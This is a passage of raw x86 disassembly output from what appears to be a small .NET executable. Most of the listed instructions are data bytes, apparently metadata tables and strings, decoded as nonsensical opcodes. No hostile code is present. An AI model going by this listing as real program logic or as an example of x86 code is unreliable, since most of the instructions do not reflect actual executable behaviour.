  403483:	add    BYTE PTR [eax],dl
  403485:	add    BYTE PTR [eax+eax*1+0x1f],bl
  403489:	add    BYTE PTR ds:0xf000e00,al
  40348f:	add    BYTE PTR [eax+0x66001001],al
  403495:	add    BYTE PTR [edi],bl
  403497:	add    BYTE PTR ds:0x28001000,al
  40349d:	add    BYTE PTR [ecx],al
  40349f:	add    ah,ah
  4034a1:	add    BYTE PTR ds:0xec060600,bl
  4034a7:	add    DWORD PTR [eax+eax*1+0x56],esp
  4034ab:	xor    ah,0x1
  4034ae:	add    BYTE PTR [bp-0x80],dl
  4034b2:	stc    
  4034b3:	add    DWORD PTR [edi+0x0],esp
  4034b6:	push   esi
  4034b7:	cmp    dh,0x1
  4034ba:	add    BYTE PTR [bp-0x80],dl
  4034be:	add    al,BYTE PTR [edx]
  4034c0:	add    BYTE PTR [bp-0x80],dl
  4034c4:	or     eax,0x56006702
  4034c9:	adc    BYTE PTR [ebx],0x2
  4034cc:	add    BYTE PTR [bp-0x80],dl
  4034d0:	sbb    al,BYTE PTR [edx]
  4034d2:	add    BYTE PTR [bp-0x80],dl
  4034d6:	daa    
  4034d7:	add    ah,BYTE PTR [edi+0x0]
  4034da:	push   esi
  4034db:	xor    BYTE PTR [ecx],0x2
  4034de:	add    BYTE PTR [bp-0x80],dl
  4034e2:	cmp    eax,0x56006702
  4034e7:	add    BYTE PTR [edi+0x2],0x67
  4034eb:	add    BYTE PTR [ecx],dl
  4034ed:	add    BYTE PTR [ebp+0x2],ch
  4034f0:	mov    ds:0x9a001100,al
  4034f5:	add    ah,BYTE PTR [esi+0x2805600]
  4034fb:	pop    es
  4034fc:	int3   
  4034fd:	add    BYTE PTR [esi-0x80],dl
  403500:	sysret 
  403502:	int3   
  403503:	add    BYTE PTR [esi-0x80],dl
  403506:	sbb    al,0x7
  403508:	int3   
  403509:	add    BYTE PTR [eax+0x21],dl
  40350c:	add    BYTE PTR [eax],al
  40350e:	add    BYTE PTR [eax],al
  403510:	xchg   ecx,eax
  403511:	add    BYTE PTR [edx+0x1000a00],bl
  403517:	add    BYTE PTR [ecx+eiz*1+0x0],ah
  40351e:	xchg   BYTE PTR [eax],bl
  403520:	lahf   
  403521:	add    BYTE PTR [eax],dl
  403523:	add    BYTE PTR [edx],al
  403525:	add    BYTE PTR [ecx+eiz*1+0x0],ch
  40352c:	xchg   BYTE PTR [eax],cl
  40352e:	in     al,dx
  40352f:	add    BYTE PTR [ecx],ah
  403531:	add    BYTE PTR [edx],al
  403533:	add    BYTE PTR [ecx+eiz*1+0x0],dh
  40353a:	xchg   BYTE PTR [eax],cl
  40353c:	add    BYTE PTR [ecx],al
  40353e:	add    BYTE PTR es:[edx],al
  403541:	add    al,al
  403543:	and    DWORD PTR [eax],eax
  403545:	add    BYTE PTR [eax],al
  403547:	add    BYTE PTR [esi+0x2c011400],al
  40354d:	add    BYTE PTR [ebx],al
  40354f:	add    BYTE PTR [edx+eiz*1],ah
  403552:	add    BYTE PTR [eax],al
  403554:	add    BYTE PTR [eax],al
  403556:	add    DWORD PTR [eax],0x2c0118
  40355c:	add    al,0x0
  40355e:	sub    BYTE PTR [eax+eax*1],ah
  403561:	add    BYTE PTR [eax],al
  403563:	add    BYTE PTR [ecx+0x32012900],dl
  403569:	add    BYTE PTR ds:0x244100,al
  40356f:	add    BYTE PTR [eax],al
  403571:	add    BYTE PTR [ecx+0x38014300],dl
  403577:	add    BYTE PTR [esi],al
  403579:	add    BYTE PTR [esp+0x0],dl
  40357d:	add    BYTE PTR [eax],al
  40357f:	add    BYTE PTR [ecx+0x3c015300],al
  403585:	add    BYTE PTR [esi],al
  403587:	add    BYTE PTR [eiz*1+0x0],ah
  40358e:	add    DWORD PTR [eax],0x47016d
  403594:	or     al,BYTE PTR [eax]
  403596:	and    BYTE PTR ds:0x0,0x81
  40359d:	add    BYTE PTR [esi+0xb004c01],al
  4035a3:	add    BYTE PTR [eax],al
  4035a5:	add    BYTE PTR es:[eax],al
  4035a8:	add    BYTE PTR [eax],al
  4035aa:	add    DWORD PTR [eax],0x5301b7
  4035b0:	or     eax,0x264800
  4035b5:	add    BYTE PTR [eax],al
  4035b7:	add    BYTE PTR [ecx+0x5901c900],dl
  4035bd:	add    BYTE PTR [esi],cl
  4035bf:	add    BYTE PTR [ebx+0x26],bh
  4035c2:	add    BYTE PTR [eax],al
  4035c4:	add    BYTE PTR [eax],al
  4035c6:	xchg   BYTE PTR [eax],bl
  4035c8:	lahf   
  4035c9:	add    BYTE PTR [eax],dl
  4035cb:	add    BYTE PTR [eax],dl
  4035cd:	add    BYTE PTR [ebx+0x26],al
  4035d3:	add    BYTE PTR [ebx+0x10009f18],al
  4035d9:	add    BYTE PTR [eax],dl
  4035db:	add    BYTE PTR [esi+eiz*1+0x0],cl
  4035e2:	xchg   ebx,eax
  4035e3:	or     BYTE PTR [edx+0x1000aa02],ch
  4035e9:	add    bl,cl
  4035eb:	add    BYTE PTR es:[eax],al
  4035ee:	add    BYTE PTR [eax],al
  4035f0:	xchg   ebx,eax
  4035f1:	or     BYTE PTR [esi+0x1000af02],bh
  4035f7:	add    dl,dl
  4035f9:	add    BYTE PTR es:[eax],al
  4035fc:	add    BYTE PTR [eax],al
  4035fe:	xchg   ebx,eax
  4035ff:	or     dl,cl
  403601:	add    dh,BYTE PTR [eax+eax*1+0x26da0010]
  403608:	add    BYTE PTR [eax],al
  40360a:	add    BYTE PTR [eax],al
  40360c:	xchg   ebx,eax
  40360d:	or     dh,dl
  40360f:	add    bh,BYTE PTR [edx-0xfffef00]
  403615:	add    BYTE PTR es:[eax],al
  403618:	add    BYTE PTR [eax],al
  40361a:	xchg   ebx,eax
  40361b:	or     bl,dh
  40361d:	add    bh,BYTE PTR [edx+0x6001100]
  403623:	daa    
  403624:	add    BYTE PTR [eax],al
  403626:	add    BYTE PTR [eax],al
  403628:	xchg   ebx,eax
  403629:	or     BYTE PTR ds:0x1100ba03,cl
  40362f:	add    BYTE PTR [edi+eiz*1],bl
  403632:	add    BYTE PTR [eax],al
  403634:	add    BYTE PTR [eax],al
  403636:	xchg   ebx,eax
  403637:	or     BYTE PTR [edx],ch
  403639:	add    edi,DWORD PTR [edx+0x32001100]
  40363f:	daa    
  403640:	add    BYTE PTR [eax],al
  403642:	add    BYTE PTR [eax],al
  403644:	xchg   ebx,eax
  403645:	or     BYTE PTR [ecx+0x3],al
  403648:	mov    edx,0x48001100
  40364d:	daa    
  40364e:	add    BYTE PTR [eax],al
  403650:	add    BYTE PTR [eax],al
  403652:	xchg   ebx,eax
  403653:	or     BYTE PTR [edi+0x3],bl
  403656:	mov    edx,0x5e001100
  40365b:	daa    
  40365c:	add    BYTE PTR [eax],al
  40365e:	add    BYTE PTR [eax],al
  403660:	xchg   ebx,eax
  403661:	or     BYTE PTR [eax+0x1100ba03],al
  403667:	add    BYTE PTR [edi+eiz*1+0x0],dh
  40366b:	add    BYTE PTR [eax],al
  40366d:	add    BYTE PTR [ebx-0x45fc5cf8],dl
  403673:	add    BYTE PTR [ecx],dl
  403675:	add    BYTE PTR [edx+0x27],cl
  40367b:	add    BYTE PTR [ebx-0x45fc3df8],dl
  403681:	add    BYTE PTR [ecx],dl
  403683:	add    BYTE PTR [eax+0x27],ah
  403689:	add    BYTE PTR [ebx-0x45fc1af8],dl
  40368f:	add    BYTE PTR [ecx],dl
  403691:	add    BYTE PTR [esi+0x27],dh
  403697:	add    BYTE PTR [ebx-0x45fc04f8],dl
  40369d:	add    BYTE PTR [ecx],dl
  40369f:	add    ah,cl
  4036a1:	daa    
  4036a2:	add    BYTE PTR [eax],al
  4036a4:	add    BYTE PTR [eax],al
  4036a6:	xchg   ebx,eax
  4036a7:	or     BYTE PTR [eax],bl
  4036a9:	add    al,0xba
  4036ab:	add    BYTE PTR [ecx],dl
  4036ad:	add    dl,ah
  4036af:	daa    
  4036b0:	add    BYTE PTR [eax],al
  4036b2:	add    BYTE PTR [eax],al
  4036b4:	xchg   ebx,eax
  4036b5:	or     BYTE PTR [edi],ch
  4036b7:	add    al,0xba
  4036b9:	add    BYTE PTR [ecx],dl
  4036bb:	add    al,bh
  4036bd:	daa    
  4036be:	add    BYTE PTR [eax],al
  4036c0:	add    BYTE PTR [eax],al
  4036c2:	xchg   ebx,eax
  4036c3:	or     BYTE PTR [edi+0x4],al
  4036c6:	mov    edx,0xe001100
  4036cb:	sub    BYTE PTR [eax],al
  4036cd:	add    BYTE PTR [eax],al
  4036cf:	add    BYTE PTR [ebx-0x45fb9ff8],dl
  4036d5:	add    BYTE PTR [ecx],dl
  4036d7:	add    BYTE PTR [eax+ebp*1],ah
  4036da:	add    BYTE PTR [eax],al
  4036dc:	add    BYTE PTR [eax],al
  4036de:	xchg   ebx,eax
  4036df:	or     BYTE PTR [edi+0x4],bh
  4036e2:	mov    edx,0x3a001100
  4036e7:	sub    BYTE PTR [eax],al
  4036e9:	add    BYTE PTR [eax],al
  4036eb:	add    BYTE PTR [ebx-0x45fb69f8],dl
  4036f1:	add    BYTE PTR [ecx],dl
  4036f3:	add    BYTE PTR [eax+0x28],dl
  4036f6:	add    BYTE PTR [eax],al
  4036f8:	add    BYTE PTR [eax],al
  4036fa:	xchg   ebx,eax
  4036fb:	or     BYTE PTR [edx+0x1100ba04],dh
  403701:	add    BYTE PTR [esi+0x28],ah
  403704:	add    BYTE PTR [eax],al
  403706:	add    BYTE PTR [eax],al
  403708:	xchg   ebx,eax
  403709:	or     al,dl
  40370b:	add    al,0xba
  40370d:	add    BYTE PTR [ecx],dl
  40370f:	add    BYTE PTR [eax+ebp*1+0x0],bh
  403713:	add    BYTE PTR [eax],al
  403715:	add    BYTE PTR [ebx-0x45fb14f8],dl
  40371b:	add    BYTE PTR [ecx],dl
  40371d:	add    BYTE PTR [edx+0x28],dl
  403723:	add    BYTE PTR [ebx-0x45faf8f8],dl
  403729:	add    BYTE PTR [ecx],dl
  40372b:	add    BYTE PTR [eax],al
  40372d:	add    BYTE PTR [ecx],al
  40372f:	add    BYTE PTR [ebx],ch
  403731:	pop    es
  403732:	add    BYTE PTR [eax],al
  403734:	add    DWORD PTR [eax],eax
  403736:	xor    BYTE PTR [edi],al
  403738:	add    BYTE PTR [eax],al
  40373a:	add    DWORD PTR [eax],eax
  40373c:	sub    eax,DWORD PTR [edi]
  40373e:	add    BYTE PTR [eax],al
  403740:	add    DWORD PTR [eax],eax
  403742:	sub    eax,DWORD PTR [edi]
  403744:	add    BYTE PTR [eax],al
  403746:	add    DWORD PTR [eax],eax
  403748:	ss pop es
  40374a:	add    BYTE PTR [eax],al
  40374c:	add    DWORD PTR [eax],eax
  40374e:	ss pop es
  403750:	add    BYTE PTR [eax],al
  403752:	add    al,BYTE PTR [eax]
  403754:	ds pop es
  403756:	add    BYTE PTR [eax],al
  403758:	add    eax,DWORD PTR [eax]
  40375a:	sub    eax,DWORD PTR [edi]
  40375c:	add    BYTE PTR [eax],al
  40375e:	add    al,0x0
  403760:	inc    edi
  403761:	pop    es
  403762:	add    BYTE PTR [eax],al
  403764:	add    DWORD PTR [eax],eax
  403766:	push   eax
  403767:	pop    es
  403768:	add    BYTE PTR [eax],al
  40376a:	add    DWORD PTR [eax],eax
  40376c:	ss pop es
  40376e:	add    BYTE PTR [eax],al
  403770:	add    al,BYTE PTR [eax]
  403772:	inc    edi
  403773:	pop    es
  403774:	add    BYTE PTR [eax],al
  403776:	add    DWORD PTR [eax],eax
  403778:	inc    edi
  403779:	pop    es
  40377a:	add    BYTE PTR [eax],al
  40377c:	add    DWORD PTR [eax],eax
  40377e:	inc    edi
  40377f:	pop    es
  403780:	add    BYTE PTR [eax],al
  403782:	add    al,BYTE PTR [eax]
  403784:	pop    edx
  403785:	pop    es
  403786:	add    BYTE PTR [eax],al
  403788:	add    DWORD PTR [eax],eax
  40378a:	xor    BYTE PTR [edi],al
  40378c:	cmp    DWORD PTR [eax],eax
  40378e:	lahf   
  40378f:	add    BYTE PTR [edi+0x0],al
  403792:	inc    ecx
  403793:	add    BYTE PTR [edi+0x4900e000],bl
  403799:	add    BYTE PTR [edi+0x5100e000],bl
  40379f:	add    BYTE PTR [edi+0x59004700],bl
  4037a5:	add    BYTE PTR [edi+0x61004700],bl
  4037ab:	add    BYTE PTR [edi+0x69004700],bl
  4037b1:	add    BYTE PTR [edi+0x71004700],bl
  4037b7:	add    BYTE PTR [edi+0x79004700],bl
  4037bd:	add    BYTE PTR [edi-0x7effb900],bl
  4037c3:	add    BYTE PTR [edi-0x76ffb900],bl
  4037c9:	add    BYTE PTR [edi-0x6effb900],bl
  4037cf:	add    BYTE PTR [edi-0x66ffb900],bl
  4037d5:	add    BYTE PTR [edi-0x5effb900],bl
  4037db:	add    BYTE PTR [edi-0x56ffb900],bl
  4037e1:	add    BYTE PTR [edi-0x4eff2000],bl
  4037e7:	add    BYTE PTR [edi-0x46ffb900],bl
  4037ed:	add    BYTE PTR [edi-0x3eff1b00],bl
  4037f3:	add    BYTE PTR [edi-0x36fff000],bl
  4037f9:	add    BYTE PTR [edi-0x26ff1500],bl
  4037ff:	add    BYTE PTR [edi-0x1eff0f00],bl
  403805:	add    BYTE PTR [edi-0x16fff000],bl
  40380b:	add    BYTE PTR [edx],bh
  40380d:	or     bl,BYTE PTR [eax+0x7f00f101]
  403813:	or     bl,BYTE PTR [ebp-0x58ff06ff]
  403819:	or     ah,BYTE PTR [ebx-0x44fef6ff]
  40381f:	or     ch,BYTE PTR [ecx-0x38fefeff]
  403825:	or     al,BYTE PTR [edi+0x0]
  403828:	adc    DWORD PTR [ecx],eax
  40382a:	fisttp QWORD PTR [edx]
  40382c:	lods   eax,DWORD PTR ds:[esi]
  40382d:	add    DWORD PTR [ecx],ecx
  40382f:	add    BYTE PTR [edi+0x19001000],bl
  403835:	add    BYTE PTR [edi+0x19001000],bl
  40383b:	add    dl,ah
  40383d:	or     bh,BYTE PTR [ebx-0xdff06ff]
  403843:	or     ah,BYTE PTR [ebx-0x5ffe6ff]
  403849:	or     bh,BYTE PTR [ebx+0xb001901]
  40384f:	or     edx,DWORD PTR [eax]
  403851:	add    BYTE PTR [ecx],bl
  403853:	add    BYTE PTR [ebx],dl
  403855:	or     eax,edx
  403857:	add    DWORD PTR [ecx],ebx
  403859:	add    DWORD PTR [ecx],ebp
  40385b:	or     ecx,ebx
  40385d:	add    DWORD PTR [ecx],ebx
  40385f:	add    DWORD PTR [edi],esi
  403861:	or     ebp,DWORD PTR [ecx+0x3c011901]
  403867:	or     eax,edx
  403869:	add    DWORD PTR [ecx],ebx
  40386b:	add    DWORD PTR [edi+0xb],eax
  40386e:	rol    BYTE PTR [ecx],1
  403870:	sbb    DWORD PTR [ecx],eax
  403872:	push   ecx
  403873:	or     edx,ebp
  403875:	add    DWORD PTR [ecx],ebx
  403877:	add    DWORD PTR [ebx+0xb],ebx
  40387a:	fiadd  DWORD PTR [ecx]
  40387c:	sbb    DWORD PTR [ecx],eax
  40387e:	jae    0x40388b
  403880:	loopne 0x403883
  403882:	sbb    DWORD PTR [eax],eax
  403884:	jnp    0x403891
  403886:	loopne 0x403888
  403888:	sbb    DWORD PTR [eax],eax
  40388a:	nop
  40388b:	or     esp,eax
  40388d:	add    BYTE PTR [ecx],bl
  40388f:	add    dl,cl
  403891:	or     edi,ecx
  403893:	add    DWORD PTR [eax+eax*1],ecx
  403896:	(bad)  [ebx]
  403898:	or     DWORD PTR [edx],eax
  40389a:	sbb    DWORD PTR [eax],eax
  40389c:	fisttp QWORD PTR [ebx]
  40389e:	inc    edi
  40389f:	add    BYTE PTR [ecx],bl
  4038a1:	add    ah,ch
  4038a3:	or     ecx,DWORD PTR [edi]
  4038a5:	add    dh,BYTE PTR [ecx]
  4038a7:	add    DWORD PTR [edi+0x19021500],ebx
  4038ad:	add    BYTE PTR [eax],dl
  4038af:	or     al,0x1b
  4038b1:	add    dl,BYTE PTR [eax+eax*1]
  4038b4:	(bad)  [ebx]
  4038b6:	or     DWORD PTR [edx],eax
  4038b8:	xor    DWORD PTR [eax],eax
  4038ba:	lahf   
  4038bb:	add    BYTE PTR [edi+0x0],al
  4038be:	jmp    0x384c60c3
  4038c3:	add    bl,BYTE PTR [ecx]
  4038c5:	add    DWORD PTR [ebp+0xc],esp
  4038c8:	inc    ebx
  4038c9:	add    bl,BYTE PTR [ecx]
  4038cb:	add    DWORD PTR [ecx+0xb],edx
  4038ce:	dec    eax
  4038cf:	add    bl,BYTE PTR [ecx]
  4038d1:	add    BYTE PTR [eax+0x49024e0c],dh
  4038d7:	add    ecx,ebx
  4038d9:	or     esp,ebp
  4038db:	add    BYTE PTR [ecx+0x1],dl
  4038de:	xlat   BYTE PTR ds:[ebx]
  4038df:	or     al,0x5c
  4038e1:	add    dl,BYTE PTR [ecx]
  4038e3:	add    cl,ch
  4038e5:	or     al,0x65
  4038e7:	add    dh,BYTE PTR [ecx]
  4038e9:	add    bh,ch
  4038eb:	or     al,0xaf
  4038ed:	add    BYTE PTR [ecx],bl
  4038ef:	add    DWORD PTR [edx],edx
  4038f1:	or     eax,0x1410273
  4038f6:	lahf   
  4038f7:	add    BYTE PTR [edi+0x0],al
  4038fa:	imul   eax,DWORD PTR [ecx],0xe5009f
  403900:	jno    0x403903
  403902:	lahf   
  403903:	add    BYTE PTR [eax],dl
  403905:	add    BYTE PTR [ecx+0x1],bh
  403908:	lahf   
  403909:	add    BYTE PTR [eax],dl
  40390b:	add    BYTE PTR [ecx],cl
  40390d:	add    BYTE PTR [eax+0x5102c40d],al
  403913:	add    DWORD PTR [ecx+0x2902ca0d],ebx
  403919:	add    BYTE PTR [edi+0x2902d000],bl
  40391f:	add    BYTE PTR [esi-0x76fd22f3],ah
  403925:	add    DWORD PTR [edi+0x802e400],ebx
  40392b:	add    BYTE PTR [eax+eax*1],cl
  40392e:	imul   eax,DWORD PTR [eax],0x8
  403931:	add    BYTE PTR [eax],dl
  403933:	add    BYTE PTR [eax+0x0],dh
  403936:	or     BYTE PTR [eax],al
  403938:	adc    al,0x0
  40393a:	jne    0x40393c
  40393c:	or     BYTE PTR [eax],al
  40393e:	sbb    BYTE PTR [eax],al
  403940:	jp     0x403942
  403942:	or     BYTE PTR [eax],al
  403944:	sbb    al,0x0
  403946:	jg     0x403948
  403948:	or     BYTE PTR [eax],al
  40394a:	and    BYTE PTR [eax],al
  40394c:	test   BYTE PTR [eax],al
  40394e:	or     BYTE PTR [eax],al
  403950:	and    al,0x0
  403952:	mov    DWORD PTR [eax],eax
  403954:	or     BYTE PTR [eax],al
  403956:	sub    BYTE PTR [eax],al
  403958:	mov    es,WORD PTR [eax]
  40395a:	or     BYTE PTR [eax],al
  40395c:	sub    al,0x0
  40395e:	xchg   ebx,eax
  40395f:	add    BYTE PTR [eax],cl
  403961:	add    BYTE PTR [eax],dh
  403963:	add    BYTE PTR [eax+0x34000800],bl
  403969:	add    BYTE PTR [ebp+0x40000e00],bl
  40396f:	add    bh,cl
  403971:	add    BYTE PTR [esi],cl
  403973:	add    BYTE PTR [eax+eax*1-0x2c],al
  403977:	add    BYTE PTR [esi],cl
  403979:	add    BYTE PTR [eax+0x0],cl
  40397c:	xlat   BYTE PTR ds:[ebx]
  40397d:	add    BYTE PTR [eax],ah
  40397f:	add    BYTE PTR [ebx+0x2e007000],ch
  403985:	add    BYTE PTR [ebx],dh
  403987:	add    BYTE PTR [eax],bh
  403989:	add    ebp,DWORD PTR [esi]
  40398b:	add    BYTE PTR [ebx],bh
  40398d:	add    BYTE PTR [edx+0x3],cl
  403990:	add    BYTE PTR cs:[ebx+0x0],al
  403994:	add    ebp,DWORD PTR gs:[esi]
  403997:	add    BYTE PTR [ebx+0x2e077e00],ah
  40399d:	add    BYTE PTR [ebx+0x0],bl
  4039a0:	mov    edi,0x9b002e03
  4039a5:	add    bl,ch
  4039a7:	add    ch,BYTE PTR [esi]
  4039a9:	add    BYTE PTR [ebx],dl
  4039ab:	add    BYTE PTR [ebx+eax*1],ch
  4039ae:	add    BYTE PTR cs:[ebx],bl
  4039b1:	add    BYTE PTR [edx],dh
  4039b3:	add    ebp,DWORD PTR [esi]
  4039b5:	add    BYTE PTR [ebx],ah
  4039b7:	add    BYTE PTR [eax],bh
  4039b9:	add    ebp,DWORD PTR [esi]
  4039bb:	add    BYTE PTR [ebx],ch
  4039bd:	add    BYTE PTR [eax],bh
  4039bf:	add    ebp,DWORD PTR [esi]
  4039c1:	add    BYTE PTR [ebx+0x0],ch
  4039c4:	rol    DWORD PTR [ebx],1
  4039c6:	add    BYTE PTR cs:[ebx+0x0],cl
  4039ca:	mov    eax,DWORD PTR [ebx]
  4039cc:	add    BYTE PTR cs:[ebx],cl
  4039cf:	add    ah,dh
  4039d1:	add    ch,BYTE PTR [esi]
  4039d3:	add    BYTE PTR [ebx+0x0],ah
  4039d6:	mov    edi,0x7b002e03
  4039db:	add    BYTE PTR [edx],dh
  4039dd:	add    ebp,DWORD PTR [esi]
  4039df:	add    BYTE PTR [ebx+0x0],dh
  4039e2:	fild   WORD PTR [ebx]
  4039e4:	add    BYTE PTR cs:[ebx+0x2e03ea00],al
  4039eb:	add    BYTE PTR [ebx+0x2e041500],cl
  4039f1:	add    BYTE PTR [ebx+0x49075f00],dl
  4039f7:	add    BYTE PTR [ebx],ch
  4039f9:	add    ch,bl
  4039fb:	add    ch,BYTE PTR [ecx+0x0]
  4039fe:	sub    eax,DWORD PTR [edx]
  403a00:	jmp    0x403a04
  403a02:	mov    ds:0x70020300,eax
  403a07:	add    BYTE PTR [ebx-0x7cfe0d00],ah
  403a0d:	add    ah,BYTE PTR [ebx+0x7001fb00]
  403a13:	add    bl,al
  403a15:	add    BYTE PTR [ebx],al
  403a17:	add    dh,BYTE PTR [eax+0x0]
  403a1a:	mov    dl,0x1
  403a1c:	mov    BYTE PTR [ecx],0xe9
  403a1f:	add    esp,esi
  403a21:	add    DWORD PTR [edi],ebp
  403a23:	add    bh,BYTE PTR [esi]
  403a25:	add    dl,BYTE PTR [edx+eax*1+0x6e]
  403a29:	add    bh,BYTE PTR [ebp+0x2]
  403a2c:	fadd   DWORD PTR [edx]
  403a2e:	add    eax,DWORD PTR [eax]
  403a30:	add    DWORD PTR [eax],eax
  403a32:	add    eax,0x200
  403a37:	add    ah,bl
  403a39:	add    DWORD PTR [edi+0x0],ebx
  403a3c:	add    BYTE PTR [eax],al
  403a3e:	pop    ebp
  403a3f:	add    bh,BYTE PTR [esi+0x12000000]
  403a45:	add    eax,0xc3
  403a4a:	sbb    al,BYTE PTR ds:0xc8
  403a50:	xor    eax,DWORD PTR ds:0xc8
  403a56:	dec    ecx
  403a57:	add    eax,0xc8
  403a5c:	bound  eax,QWORD PTR ds:0xc8
  403a62:	jne    0x403a69
  403a64:	enter  0x0,0x0
  403a68:	pop    DWORD PTR ds:0xc8
  403a6e:	lods   al,BYTE PTR ds:[esi]
  403a6f:	add    eax,0xc8
  403a74:	retf   
  403a75:	add    eax,0xc8
  403a7a:	out    0x5,al
  403a7c:	enter  0x0,0x0
  403a80:	add    eax,0xc806
  403a85:	add    BYTE PTR [edi],dl
  403a87:	push   es
  403a88:	enter  0x0,0x0
  403a8c:	xor    BYTE PTR [esi],al
  403a8e:	enter  0x0,0x0
  403a92:	inc    ebx
  403a93:	push   es
  403a94:	enter  0x0,0x0
  403a98:	push   edi
  403a99:	push   es
  403a9a:	enter  0x0,0x0
  403a9e:	ins    BYTE PTR es:[edi],dx
  403a9f:	push   es
  403aa0:	enter  0x0,0x0
  403aa4:	xchg   DWORD PTR [esi],eax
  403aa6:	enter  0x0,0x0
  403aaa:	call   0xb200:0xc806
  403ab1:	push   es
  403ab2:	enter  0x0,0x0
  403ab6:	int3   
  403ab7:	push   es
  403ab8:	enter  0x0,0x0
  403abc:	jecxz  0x403ac4
  403abe:	enter  0x0,0x0
  403ac2:	sti    
  403ac3:	push   es
  403ac4:	enter  0x200,0x0
  403ac8:	add    eax,DWORD PTR [eax]
  403aca:	add    eax,DWORD PTR [eax]
  403acc:	add    DWORD PTR [eax],eax
  403ace:	add    al,0x0
  403ad0:	add    eax,DWORD PTR [eax]
  403ad2:	add    al,BYTE PTR [eax]
  403ad4:	adc    BYTE PTR [eax],al
  403ad6:	add    eax,0x11000200
  403adb:	add    BYTE PTR [edi],al
  403add:	add    BYTE PTR [ecx],al
  403adf:	add    BYTE PTR [edx],dl
  403ae1:	add    BYTE PTR [edi],al
  403ae3:	add    BYTE PTR [edx],al
  403ae5:	add    BYTE PTR [ebx],dl
  403ae7:	add    BYTE PTR [ecx],cl
  403ae9:	add    BYTE PTR [edx],al
  403aeb:	add    BYTE PTR [eax+eax*1],dl
  403aee:	or     eax,DWORD PTR [eax]
  403af0:	add    al,BYTE PTR [eax]
  403af2:	adc    eax,0x2000d00
  403af7:	add    BYTE PTR [esi],dl
  403af9:	add    BYTE PTR [edi],cl
  403afb:	add    BYTE PTR [edx],al
  403afd:	add    BYTE PTR [edi],dl
  403aff:	add    BYTE PTR [ecx],dl
  403b01:	add    BYTE PTR [edx],al
  403b03:	add    BYTE PTR [eax],bl
  403b05:	add    BYTE PTR [ebx],dl
  403b07:	add    BYTE PTR [edx],al
  403b09:	add    BYTE PTR [ecx],bl
  403b0b:	add    BYTE PTR ds:0x1a000200,dl
  403b11:	add    BYTE PTR [edi],dl
  403b13:	add    BYTE PTR [edx],al
  403b15:	add    BYTE PTR [ebx],bl
  403b17:	add    BYTE PTR [ecx],bl
  403b19:	add    BYTE PTR [edx],al
  403b1b:	add    BYTE PTR [eax+eax*1],bl
  403b1e:	sbb    eax,DWORD PTR [eax]
  403b20:	add    al,BYTE PTR [eax]
  403b22:	sbb    eax,0x2001d00
  403b27:	add    BYTE PTR [esi],bl
  403b29:	add    BYTE PTR [edi],bl
  403b2b:	add    BYTE PTR [edx],al
  403b2d:	add    BYTE PTR [edi],bl
  403b2f:	add    BYTE PTR [ecx],ah
  403b31:	add    BYTE PTR [edx],al
  403b33:	add    BYTE PTR [eax],ah
  403b35:	add    BYTE PTR [ebx],ah
  403b37:	add    BYTE PTR [edx],al
  403b39:	add    BYTE PTR [ecx],ah
  403b3b:	add    BYTE PTR ds:0x22000200,ah
  403b41:	add    BYTE PTR [edi],ah
  403b43:	add    BYTE PTR [edx],al
  403b45:	add    BYTE PTR [ebx],ah
  403b47:	add    BYTE PTR [ecx],ch
  403b49:	add    BYTE PTR [edx],al
  403b4b:	add    BYTE PTR [eax+eax*1],ah
  403b4e:	sub    eax,DWORD PTR [eax]
  403b50:	add    al,BYTE PTR [eax]
  403b52:	and    eax,0x2002d00
  403b57:	add    BYTE PTR [esi],ah
  403b59:	add    BYTE PTR [edi],ch
  403b5b:	add    BYTE PTR [edx],al
  403b5d:	add    BYTE PTR [edi],ah
  403b5f:	add    BYTE PTR [ecx],dh
  403b61:	add    BYTE PTR [edx],al
  403b63:	add    ah,BYTE PTR [esi]
  403b65:	add    al,BYTE PTR [eax+eax*4]
  403b68:	add    BYTE PTR [eax],al
  403b6a:	or     eax,DWORD PTR [eax]
  403b6c:	add    BYTE PTR [eax],al
  403b6e:	add    BYTE PTR [eax],al
  403b70:	add    BYTE PTR [eax],al
  403b72:	add    DWORD PTR [eax],eax
  403b74:	add    BYTE PTR [eax],al
  403b76:	test   BYTE PTR [eax],0x42
  403b79:	add    BYTE PTR [eax],al
  403b7b:	add    BYTE PTR [eax+eax*1],al
	...
  403b86:	add    BYTE PTR [eax],al
  403b88:	add    DWORD PTR [eax],eax
  403b8a:	jle    0x403b8c
  403b8c:	add    BYTE PTR [eax],al
  403b8e:	add    BYTE PTR [eax],al
  403b90:	or     eax,DWORD PTR [eax]
	...
  403b9a:	add    BYTE PTR [eax],al
  403b9c:	adc    al,0x0
  403b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b9f:	add    BYTE PTR [eax],al
  403ba1:	add    BYTE PTR [eax],al
  403ba3:	add    BYTE PTR [ebx],cl
	...
  403bad:	add    BYTE PTR [eax],al
  403baf:	add    BYTE PTR [eax+eax*1],dl
  403bb2:	dec    esp
  403bb3:	or     al,BYTE PTR [eax]
  403bb5:	add    BYTE PTR [eax],al
  403bb7:	add    BYTE PTR [ebx],cl
	...
  403bc1:	add    BYTE PTR [eax],al
  403bc3:	add    BYTE PTR [eax+eax*1],dl
  403bc6:	ins    DWORD PTR es:[edi],dx
  403bc7:	or     al,0x0
  403bc9:	add    BYTE PTR [eax],al
  403bcb:	add    BYTE PTR [eax+eax*1],al
	...
  403bd6:	add    BYTE PTR [eax],al
  403bd8:	add    DWORD PTR [eax],eax
  403bda:	xchg   DWORD PTR [eax],eax
	...
  403be4:	add    DWORD PTR [eax],eax
  403be6:	add    BYTE PTR [eax],al
  403be8:	hlt    
  403be9:	or     eax,0x40000
  403bee:	add    eax,DWORD PTR [eax]
  403bf0:	add    BYTE PTR [eax],al
  403bf2:	add    BYTE PTR [eax],al
  403bf4:	add    BYTE PTR [ecx*2+0x6c75646f],bh
  403bfb:	gs add BYTE PTR ds:[edi+0x72],al
  403c00:	popa   
  403c01:	jo     0x403c6b
  403c03:	inc    ebx
  403c04:	ins    DWORD PTR es:[edi],dx
  403c05:	fs cs gs js 0x403c6f
  403c0a:	add    BYTE PTR [eax+0x72],dl
  403c0d:	outs   dx,DWORD PTR ds:[esi]
  403c0e:	addr16 jb 0x403c72
  403c11:	ins    DWORD PTR es:[edi],dx
  403c12:	add    BYTE PTR [ebp+0x69],cl
  403c15:	arpl   WORD PTR [edx+0x6f],si
  403c18:	jae    0x403c89
  403c1a:	data16 je 0x403c4b
  403c1d:	push   esi
  403c1e:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  403c25:	jne    0x403c8b
  403c27:	imul   ebp,DWORD PTR [edi+0x2e],0x676f7250
